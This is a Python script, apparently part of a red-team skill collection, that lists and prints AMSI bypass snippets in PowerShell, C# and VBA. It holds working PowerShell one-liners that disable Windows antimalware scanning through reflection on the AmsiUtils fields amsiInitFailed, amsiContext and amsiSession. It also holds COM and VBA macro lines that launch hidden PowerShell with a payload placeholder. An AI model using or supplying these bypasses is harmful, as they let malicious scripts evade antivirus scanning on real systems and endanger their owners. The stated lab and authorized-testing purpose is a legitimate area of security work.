#!/usr/bin/env python3
"""List and print AMSI bypass snippets for lab and authorized red-team testing.

Usage:
  python skills/bypass/scripts/amsi_snippets.py --list --format powershell
"""

from __future__ import annotations

import argparse


SNIPPETS = {
    "patch": {
        "description": "Patch AmsiScanBuffer return path in-memory.",
        "powershell": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "csharp": "// Locate amsi.dll!AmsiScanBuffer and patch prologue to return AMSI_RESULT_CLEAN.",
        "vba": "' AMSI patch technique typically staged via unmanaged calls from VBA macro shellcode loader.",
    },
    "reflection": {
        "description": "Use reflection to set amsiInitFailed and bypass scanning.",
        "powershell": "[Runtime.InteropServices.Marshal]::WriteInt32(([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)),0)",
        "csharp": "// Use reflection to modify internal AMSI context fields in PowerShell host process.",
        "vba": "' Reflection-based bypass is usually done in PowerShell stage, invoked from VBA.",
    },
    "force-error": {
        "description": "Trigger AMSI internal error state to fail-open logic in host code.",
        "powershell": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiSession','NonPublic,Static');$b.SetValue($null,$null)",
        "csharp": "// Manipulate AMSI session/context handles to induce failure and bypass checks.",
        "vba": "' Force-error pattern generally delegated to PowerShell stager from VBA.",
    },
    "com-object": {
        "description": "Run through COM object/script host paths with reduced AMSI coverage.",
        "powershell": "$s=New-Object -ComObject WScript.Shell;$s.Run('powershell -nop -w hidden <payload>')",
        "csharp": "// Instantiate COM automation objects to execute alternate scripting hosts.",
        "vba": 'CreateObject("Wscript.Shell").Run "powershell -nop -w hidden <payload>"',
    },
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="AMSI bypass snippet manager.")
    parser.add_argument("--list", action="store_true")
    parser.add_argument("--show", help="Snippet name")
    parser.add_argument(
        "--format", choices=["powershell", "csharp", "vba"], default="powershell"
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.list:
        for name, meta in SNIPPETS.items():
            print(f"{name}: {meta['description']}")
        return 0

    if args.show:
        item = SNIPPETS.get(args.show)
        if not item:
            print(f"Unknown snippet: {args.show}")
            return 1
        print(f"# {args.show} ({args.format})")
        print(item[args.format])
        return 0

    print("Use --list or --show <name>.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
